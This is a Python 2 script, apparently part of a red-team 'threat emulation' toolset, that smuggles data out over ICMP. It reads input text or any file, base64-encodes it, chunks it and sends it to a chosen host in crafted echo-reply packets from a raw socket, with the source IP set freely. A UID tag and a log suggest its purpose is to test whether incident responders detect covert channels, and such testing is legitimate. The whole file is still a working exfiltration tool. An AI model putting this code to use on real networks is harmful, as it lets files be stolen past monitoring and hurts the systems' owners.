#!/usr/bin/python
import time
from time import gmtime, strftime
import sys
import os
import base64
from impacket import ImpactPacket
from socket import *


print "===============================================V1.0================================================="
print "       some initial code taken from http://code.activestate.com/recipes/439224-data-over-icmp/      "
print "~~~~~~~~~~~~~~~~~~~~~~~part of the Threat Emulation Evaluation Toolset (TEET)~~~~~~~~~~~~~~~~~~~~~~~"
print "===========================================penetrate.io============================================="


def sender (src,dst,instring,timedelay,uid):
	# define RAW socket
	s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
	s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

	# define IP packet
	ip = ImpactPacket.IP()
	ip.set_ip_src(src)
	ip.set_ip_dst(dst)

	# define ICMP packet
	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY) #ICMP packet type

	#initial packet with UID for CIRT to find
	
	icmp.contains(ImpactPacket.Data(uid))
	ip.contains(icmp)
	icmp.set_icmp_id(666)
	icmp.set_icmp_cksum(0)
	icmp.auto_checksum = 1
	s.sendto(ip.get_packet(), (dst, 0))
	time.sleep(timedelay)

	# fragmentation for DATA fields > of 54 bytes
	x = len(instring) / 54								 
	y = len(instring) % 54								 

	seq_id = 0										
	for i in range(1,x+2):							 
		str_send = instring[54*(i-1): 54*i]				 
		icmp.contains(ImpactPacket.Data(str_send)) # fill ICMP DATA field
		ip.contains(icmp) # encapsulate ICMP packet in the IP packet	 
		seq_id = seq_id + 1							 
		icmp.set_icmp_id(seq_id)					 
		icmp.set_icmp_cksum(0)						 
		icmp.auto_checksum = 1						 
		s.sendto(ip.get_packet(), (dst, 0)) # send packet		 
		time.sleep(timedelay)	
									 
	# eventually the rest of the string 
	str_send = instring[54*i:54*i+ y]
	icmp.contains(ImpactPacket.Data(str_send))
	ip.contains(icmp)
	seq_id = seq_id + 1
	icmp.set_icmp_id(seq_id)
	icmp.set_icmp_cksum(0)
	icmp.auto_checksum = 1
	s.sendto(ip.get_packet(), (dst, 0))


def main():
	src = raw_input("Enter your source IP address: ")
	dst = raw_input("Enter your destination address: ")

	inputchoice = raw_input("Smuggle out data from stdin(0) or read in a file(1)? (0 or 1): ")
	#codechoice = raw_input("Plain text(0) or XOR it(1)? (0 or 1): ")
	timedelay = raw_input("Time between packets (seconds): ")
	timedelay = float(timedelay)


	if inputchoice == "0":
		instring = raw_input("Enter your string: ")
		instring = base64.b64encode(instring)
		print "===================================================================================================="
		print "Base64 encoded version being chunked up to send out in Data field of ICMP packet(s) "
		print instring
		print "===================================================================================================="

	elif inputchoice == "1":
		filename = raw_input("Enter the filename to read in: ")

		instring = ""
		filez = open(filename,"r");
		for line in filez:
			#print "reading in %s ..." %(line)
			instring += line

		
		print "Reading in the following text from file.." 
		print "===================================================================================================="
		print instring
		filez.close()
		instring = base64.b64encode(instring)
		print "===================================================================================================="
		print "                                                                                                    "
		print "Base64 encoded version being chunked up to send out in Data field of ICMP packet(s) "
		print instring
		print "===================================================================================================="

	uidtimestamp = strftime("%Y%m%d%H%M", gmtime())
	lengthstr = len(instring)
	lengthstr = str(lengthstr)
	uid = "TEET" + "-" + uidtimestamp + "-" + lengthstr

	sender(src,dst,instring,timedelay,uid)

	print "Your data has been smuggled out in ICMP reply packets with the unique tag %s in the first packet." %(uid)

	print "TIP:  If you want to be more overt, read in a larger file, AND lower the time delay."

	record = "ICMPSmuggler: " + "src:" + src +" dst:" + dst + " UID:" + uid + "\n"
	print "Writing to the log file: %s" %(record)
	directory="log"
	if not os.path.exists(directory):	#cheking if directory already exists
		os.makedirs(directory)
	logfile = open(directory+"/log.txt","ab")	#appending log to logfile-also creates file if not there
	logfile.write(record)
	logfile.close()

main()